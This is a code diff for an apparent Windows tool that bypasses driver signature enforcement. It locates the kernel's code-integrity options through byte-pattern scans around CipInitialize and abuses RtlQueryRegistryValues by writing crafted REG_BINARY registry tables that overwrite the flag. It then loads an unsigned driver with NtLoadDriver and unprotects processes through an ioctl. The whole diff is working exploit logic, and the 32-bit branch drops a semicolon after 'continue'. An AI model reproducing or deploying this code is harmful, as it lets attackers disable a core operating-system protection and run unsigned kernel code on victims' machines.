@@ -134,17 +134,22 @@ static ULONG_PTR ci_analyze(void *mods, wind_config_t *cfg)
 
 	// find jmp CipInitialize
 	for (int i = 0; i < 100; i++, p++) {
-#ifdef _WIN64
-		if (!memcmp(p-5, "\x48\x83\xc4\x28\xe9",5))
-			goto cipinit_found;
+		// jmp/call forwardnearby
+		if (((p[-1]&0xfe) == 0xe8) && (p[2] == 0) && (p[3] == 0)) {
+			BYTE *t = p + 4 + *((DWORD*)p);
+			DBG("candidate %x %p",p[-1],t);
+			// Don't eat the security cookie
+#if _WIN64
+			// mov rax, [rip+something]
+			if (!memcmp(t, "\x48\x8b\x05",3))
+				continue;
 #else
-		// call something; pop ebp; jmp CipInitialize
-		if (p[-1] == 0xe9 && p[-2] == 0x5d && p[-7] == 0xe8)
-			goto cipinit_found;
-		// call CipInitialize; pop ebp; ret ..
-		if (p[-1] == 0xe8 && p[4] == 0x5d)
-			goto cipinit_found;
+			// mov eax, [something]
+			if (t[0] == 0xa1)
+				continue
 #endif
+			goto cipinit_found;
+		}
 	}
 	DBG("CipInitialize not found in vicinity");
 	goto out_free;
@@ -183,7 +188,8 @@ found_ci:
 	cfg->ci_orig = ((info.BaseAddress + info.RegionSize - 4) - mod + base);
 	// Some dummy, unknown key
 	p = (void*)mod + 4096;
-	while (*((UINT32*)p)>0xff) p++;
+	// key address must incorporate RTL_QUERY_REGISTRY_DIRECT !
+	while (*((UINT32*)p)>0xff || (!(((ULONG_PTR)p)&0x20))) p++;
 	key = (ULONG_PTR)p - mod + base;
 #else
 	cfg->ci_guess = guess_ci();
@@ -353,12 +359,11 @@ static HANDLE trigger_loader(WCHAR *svc, WCHAR *ldr)
         void *mod = get_mod_info();
 	ULONG_PTR key = ci_analyze(mod, &cfg);
 
-#ifdef _WIN64
 	struct {
 		UINT64 pad;
 		RTL_QUERY_REGISTRY_TABLE tab[4] ;
 	} buffer = { .tab = {
-	{}, {}, // skip 2 entries
+	{}, {},
 	{ // save original ci_Options byte to cisave
 		.Flags = 32, // DIRECT
 		.Name = (void*)key, // valid string, but non-existent key
@@ -404,7 +409,7 @@ static HANDLE trigger_loader(WCHAR *svc, WCHAR *ldr)
 	RtlInitUnicodeString(&svcu, svc);
 	RtlInitUnicodeString(&ldru, ldr);
 
-	for (int i = 0; 1; i++) {
+	for (int retry = 0; 1; retry++) {
 		// try to load our driver if loader suceeded
 		status = NtLoadDriver(&svcu);
 		(void)status;
@@ -417,17 +422,18 @@ static HANDLE trigger_loader(WCHAR *svc, WCHAR *ldr)
 		// exit if we're in
 		if (dev)
 			break;
-		if (i  > LOAD_ATTEMPTS)
+		if (retry == 2)
 			break;
 #ifdef _WIN64
-		// on win64, there are 2 stack align variants, depending
-		// if REG_BINARY stack field lengths are negative or not.
-		if (i&1) {
-			RtlWriteRegistryValue(0, ldr, L"FlowControlDisplayBandwidth",REG_BINARY,
-					((void*)buffer.tab)-4, sizeof(buffer.tab)+4);
-		} else {
+		// first attempt - positive REG_BINARY length
+		if (!retry) {
+			DBG("REG_BINARY positive");
 			RtlWriteRegistryValue(0, ldr, L"FlowControlDisplayBandwidth", REG_BINARY,
 					((void*)buffer.tab)+4, sizeof(buffer.tab)-4);
+		} else {
+			DBG("REG_BINARY negative");
+			RtlWriteRegistryValue(0, ldr, L"FlowControlDisplayBandwidth",REG_BINARY,
+					((void*)buffer.tab)-4, sizeof(buffer.tab)+4);
 		}
 #endif
 		// request loader driver again
@@ -625,8 +631,10 @@ static int do_uninstall(int checkonly)
 		goto out;
 	if (checkonly)
 		ret = 1;
-	else
+	else {
+		printf("Service deleted.\n");
 		ret = DeleteService(h);
+	}
 	CloseServiceHandle(h);
 out:;
 	CloseServiceHandle(scm);
@@ -836,21 +844,29 @@ static int run_service()
 	HANDLE dev;
 	int pid;
 	wind_prot_t prot = {0};
+	NTSTATUS st;
 
 	DBG("service launched");
 
 	StartServiceCtrlDispatcher(s_table);
+
+	elevate();
 
 	if (!NT_SUCCESS(NtQueryInformationProcess(GetCurrentProcess(), 0, &pbi, sizeof(pbi), &uls)))
 		return 0;
 
 	pid = pbi[5];
 	prot.pid = pid;
+	DBG("got parent pid=%d",pid);
 	dev = check_driver(0);
-	if (!dev)
+	if (!dev) {
+		DBG("no driver, bye");
 		return 0;
+	}
 
-	if (!NT_SUCCESS(wind_ioctl(dev, WIND_IOCTL_PROT, &prot, sizeof(prot)))) {
+	st = wind_ioctl(dev, WIND_IOCTL_PROT, &prot, sizeof(prot));
+	if (!NT_SUCCESS(st)) {
+		DBG("failed to unprotect services %08x", (int)st);
 		wind_close(dev);
 		return 0;
 	}
